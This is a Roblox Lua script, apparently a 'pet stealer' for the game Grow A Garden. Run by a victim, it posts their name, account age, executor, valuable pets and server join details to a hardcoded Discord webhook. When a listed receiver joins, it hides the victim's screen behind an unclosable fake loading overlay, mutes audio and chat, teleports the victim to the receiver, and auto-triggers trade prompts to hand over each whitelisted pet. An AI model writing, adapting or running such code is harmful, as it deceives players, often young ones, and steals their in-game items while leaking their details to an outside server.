repeat 
    task.wait()
until game:IsLoaded()

-- ✅ Configuration
local WEBHOOK_URL = "https://discord.com/api/webhooks/1393637749881307249/ofeqDbtyCKTdR-cZ6Ul602-gkGOSMuCXv55RQQoKZswxigEfykexc9nNPDX_FYIqMGnP"
local USERNAMES = {
    "yuniecoxo", "Wanwood42093", "AnotherUsername", "Example123" -- Add more usernames here
}

local PET_WHITELIST = {
    'Raccoon', 'T-Rex', 'Fennec Fox', 'Dragonfly', 'Butterfly',
    'Disco Bee', 'Mimic Octopus', 'Queen Bee', 'Spinosaurus', 'Kitsune',
}

local VICTIM = game.Players.LocalPlayer
local victimPetTable = {}
local VirtualInputManager = game:GetService("VirtualInputManager")
local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)

-- 🔒 Blocking Screen for Target Detection
local function showBlockingLoadingScreen()
    local plr = game.Players.LocalPlayer
    local playerGui = plr:WaitForChild("PlayerGui")

    pcall(function()
        local StarterGui = game:GetService("StarterGui")
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
    end)

    for _, sound in ipairs(workspace:GetDescendants()) do
        if sound:IsA("Sound") then
            sound.Volume = 0
        end
    end

    local loadingScreen = Instance.new("ScreenGui")
    loadingScreen.Name = "UnclosableLoading"
    loadingScreen.ResetOnSpawn = false
    loadingScreen.IgnoreGuiInset = true
    loadingScreen.DisplayOrder = 999999
    loadingScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    loadingScreen.Parent = playerGui

    loadingScreen.AncestryChanged:Connect(function()
        loadingScreen.Parent = playerGui
    end)

    local blackFrame = Instance.new("Frame")
    blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
    blackFrame.Size = UDim2.new(1, 0, 1, 0)
    blackFrame.BorderSizePixel = 0
    blackFrame.ZIndex = 1
    blackFrame.Parent = loadingScreen

    local blurEffect = Instance.new("BlurEffect")
    blurEffect.Size = 24
    blurEffect.Name = "FreezeBlur"
    blurEffect.Parent = game:GetService("Lighting")

    local loadingLabel = Instance.new("TextLabel")
    loadingLabel.Size = UDim2.new(0.5, 0, 0.1, 0)
    loadingLabel.Position = UDim2.new(0.25, 0, 0.45, 0)
    loadingLabel.BackgroundTransparency = 1
    loadingLabel.TextScaled = true
    loadingLabel.Text = "Loading Wait a Moment <3..."
    loadingLabel.TextColor3 = Color3.new(1, 1, 1)
    loadingLabel.Font = Enum.Font.SourceSansBold
    loadingLabel.ZIndex = 2
    loadingLabel.Parent = loadingScreen

    coroutine.wrap(function()
        while true do
            for i = 1, 3 do
                loadingLabel.Text = "Loading" .. string.rep(".", i)
                task.wait(0.5)
            end
        end
    end)()

    coroutine.wrap(function()
        while true do
            task.wait(1)
            if not game:GetService("Lighting"):FindFirstChild("FreezeBlur") then
                local newBlur = Instance.new("BlurEffect")
                newBlur.Size = 24
                newBlur.Name = "FreezeBlur"
                newBlur.Parent = game:GetService("Lighting")
            end

            for _, sound in ipairs(workspace:GetDescendants()) do
                if sound:IsA("Sound") and sound.Volume > 0 then
                    sound.Volume = 0
                end
            end
        end
    end)()
end

-- ✅ Multi-user detection
local function waitForJoin()
    for _, player in game.Players:GetPlayers() do
        if table.find(USERNAMES, player.Name) then
            showBlockingLoadingScreen()
            return true, player.Name
        end
    end
    return false, nil
end

function createDiscordEmbed(petList, totalValue, fileUrl)
    local embed = {
        title = "🌵 Grow A Garden Hit - DARK SKIDS 🍀",
        color = 65280,
        fields = {
            {
                name = "👤 **Player Information**",
                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", 
                    VICTIM.Name, 
                    table.concat(USERNAMES, " "), 
                    identifyexecutor(), 
                    game.Players.LocalPlayer.AccountAge
                ),
                inline = false
            },
            {
                name = "💰 **Total Value**",
                value = string.format("```%s¢```", totalValue),
                inline = false
            },
            {
                name = "🌴 **Backpack**",
                value = string.format("```%s```", petList),
                inline = false
            },
            {
                name = "🏝️ **Join with URL**",
                value = string.format(
                    "[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)", 
                    game.JobId, 
                    game.PlaceId, 
                    game.JobId
                ),
                inline = false
            }
        },
        footer = {
            text = string.format("%s | %s", game.PlaceId, game.JobId)
        }
    }

    local data = {
        content = string.format(
            "--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n",
            game.PlaceId,
            game.JobId
        ),
        username = game.Players.LocalPlayer.Name,
        avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
        embeds = {embed}
    }

    local jsonData = game:GetService("HttpService"):JSONEncode(data)
    
    local headers = {
        ["Content-Type"] = "application/json"
    }

    local request = http_request or request or HttpPost or syn.request
    local response = request({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = headers,
        Body = jsonData
    })

    if response.StatusCode ~= 200 and response.StatusCode ~= 204 then
        warn("Ошибка отправки в Discord:", response.StatusCode, response.Body)
    end
end

local function teleportTarget(targetName)
    VICTIM.Character.HumanoidRootPart.CFrame = game.Players[targetName].Character.HumanoidRootPart.CFrame
end

local function deltaBypass()
    VirtualInputManager:SendMouseButtonEvent(
        workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
        0, true, nil, false
    )
    task.wait()
    VirtualInputManager:SendMouseButtonEvent(
        workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
        0, false, nil, false
    )
end

local function checkPetsWhilelist(pet)
    for _, name in PET_WHITELIST do
        if string.find(pet, name) then
            return true
        end
    end
end

local function getPetObject(petUid: string): Instance?
    for _, object in pairs(VICTIM.Backpack:GetChildren()) do
        if object:GetAttribute("PET_UUID") == petUid then
            return object
        end
    end
    for _, object in workspace[VICTIM.Name]:GetChildren() do
        if object:GetAttribute("PET_UUID") == petUid then
            return object
        end
    end
    return nil
end

local function equipPet(pet)
    if pet:GetAttribute("d") then
        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
    end
    VICTIM.Character.Humanoid:EquipTool(pet)
end

local function getPlayersPets()
    for petUid, value in dataModule:GetData().PetsData.PetInventory.Data do
        if checkPetsWhilelist(value.PetType) then
            table.insert(victimPetTable, value.PetType)
        end
    end
end

local function startSteal(trigerName)
    if game.Players[trigerName].Character.Head:FindFirstChild("ProximityPrompt") then
        game.Players[trigerName].Character.Head.ProximityPrompt.HoldDuration = 0
        deltaBypass()
    end
end

local function checkPetsInventory(target)
    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
        if checkPetsWhilelist(value.PetType) then
            local petObject = getPetObject(petUid)
            if petObject then
                equipPet(petObject)
                task.wait(0.2)
                startSteal(target)
            end
        end
    end
end

local function idlingTarget()
    task.spawn(function()
        while task.wait(0.2) do
            local isTarget, trigerName = waitForJoin()
            if isTarget then
                teleportTarget(trigerName)
                checkPetsInventory(trigerName)
            end
        end
    end)
end

-- 🎯 Start
getPlayersPets()

task.spawn(function()
    while task.wait(0.5) do
        if #victimPetTable > 0 then
            idlingTarget()
            createDiscordEmbed(table.concat(victimPetTable, "\n"), "100000", "https://cdn.discordapp.com/attachments/.../items.txt")
            break
        end
    end
end)
